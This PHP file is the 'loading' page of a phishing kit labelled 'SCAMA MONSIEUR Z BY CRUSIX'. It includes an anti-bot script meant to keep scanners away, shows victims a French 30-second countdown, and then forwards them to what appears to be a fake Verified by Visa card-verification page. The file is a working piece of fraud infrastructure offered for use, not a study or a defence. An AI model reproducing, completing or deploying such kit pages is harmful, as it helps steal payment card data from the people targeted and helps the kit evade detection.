<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
LOADING.PHP
*/
session_start();
include('../ANTIBOTS/antibots.php');



?>

<meta http-equiv='refresh' content='30;URL=vbv_01.php?<?php echo uniqid(); ?>'>
		<link nonce="" href="../css/login.css" rel="stylesheet">
   <meta name="viewport" content="width=device-width"/>
   
<center><img style="width: 300px;transform: translate(0px,50%);" src="../RESSOURCES/img/loading.gif"></center>
<p style="text-align: center;transform: translate(0px,100px);"><strong> Veuillez patienter <span id="countdowntimer">30</span> secondes </strong></p>
 <script type="text/javascript">
    var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>
